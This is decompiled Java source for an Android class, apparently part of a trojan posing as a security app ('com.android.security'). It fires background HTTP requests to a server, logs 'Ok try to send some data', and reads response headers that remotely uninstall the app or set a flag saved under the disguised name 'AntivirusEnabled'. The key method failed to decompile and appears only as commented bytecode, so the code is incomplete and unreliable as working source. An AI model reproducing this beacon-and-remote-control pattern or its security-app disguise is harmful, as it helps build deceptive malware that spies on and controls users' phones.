package com.android.security;

import android.os.SystemClock;

public class WebManager {
    public static final int DefaultRetryTime = 5000;
    public static final int HTTP_STATUS_OK = 200;
    public static final int MaxHttpRetries = 3;

    public static int MakeHttpRequestWithRetries(String uri, int NumOfRetries) {
        int RetryNumber = 0;
        int ErrorCode = 0;
        while (ErrorCode != 200 && RetryNumber < NumOfRetries) {
            ErrorCode = MakeHttpRequest(uri);
            RetryNumber++;
            if (ErrorCode != 200) {
                SystemClock.sleep(5000);
            }
        }
        return ErrorCode;
    }

    public static void FireGetRequest(final String uri) {
        new Thread(new Runnable() {
            public void run() {
                WebManager.MakeHttpRequestWithRetries(uri, 6);
            }
        }).start();
    }

    /* JADX WARNING: Code restructure failed: missing block: B:13:0x0027, code lost:
        r1 = r10.startsWith("true");
     */
    /* Code decompiled incorrectly, please refer to instructions dump. */
    public static int MakeHttpRequest(java.lang.String r13) {
        /*
            r6 = -1
            r8 = 0
            java.net.URL r9 = new java.net.URL     // Catch:{ MalformedURLException -> 0x0049 }
            r9.<init>(r13)     // Catch:{ MalformedURLException -> 0x0049 }
            r8 = r9
        L_0x0008:
            r2 = 0
            java.net.URLConnection r2 = r8.openConnection()     // Catch:{ IOException -> 0x004c, NullPointerException -> 0x0066 }
            java.lang.String r11 = "Ok try to send some data"
            com.android.security.ValueProvider.LogTrace(r11)
            r5 = r2
            java.net.HttpURLConnection r5 = (java.net.HttpURLConnection) r5
            int r6 = r5.getResponseCode()     // Catch:{ IOException -> 0x006a }
            r11 = 200(0xc8, float:2.8E-43)
            if (r6 != r11) goto L_0x0047
            java.lang.String r11 = "Uninstall"
            java.lang.String r10 = r5.getHeaderField(r11)     // Catch:{ IOException -> 0x006a }
            r0 = 0
            r1 = 0
            if (r10 == 0) goto L_0x0032
            java.lang.String r11 = "true"
            boolean r1 = r10.startsWith(r11)     // Catch:{ IOException -> 0x006a }
            if (r1 == 0) goto L_0x0032
            com.android.security.ValueProvider.UninstallSoftware()     // Catch:{ IOException -> 0x006a }
        L_0x0032:
            java.lang.String r11 = "ForgetMessages"
            java.lang.String r10 = r5.getHeaderField(r11)     // Catch:{ IOException -> 0x006a }
            if (r10 == 0) goto L_0x0047
            if (r1 != 0) goto L_0x0047
            java.lang.String r11 = "true"
            boolean r0 = r10.startsWith(r11)     // Catch:{ IOException -> 0x006a }
            java.lang.String r11 = "AntivirusEnabled"
            com.android.security.ValueProvider.SaveBoolValue(r11, r0)     // Catch:{ IOException -> 0x006a }
        L_0x0047:
            r7 = r6
        L_0x0048:
            return r7
        L_0x0049:
            r4 = move-exception
            r6 = -2
            goto L_0x0008
        L_0x004c:
            r3 = move-exception
            java.lang.StringBuilder r11 = new java.lang.StringBuilder
            java.lang.String r12 = "IoException"
            r11.<init>(r12)
            java.lang.String r12 = r3.toString()
            java.lang.StringBuilder r11 = r11.append(r12)
            java.lang.String r11 = r11.toString()
            com.android.security.ValueProvider.LogTrace(r11)
            r6 = -3
            r7 = r6
            goto L_0x0048
        L_0x0066:
            r3 = move-exception
            r6 = -5
            r7 = r6
            goto L_0x0048
        L_0x006a:
            r3 = move-exception
            r6 = -4
            goto L_0x0047
        */
        throw new UnsupportedOperationException("Method not decompiled: com.android.security.WebManager.MakeHttpRequest(java.lang.String):int");
    }
}
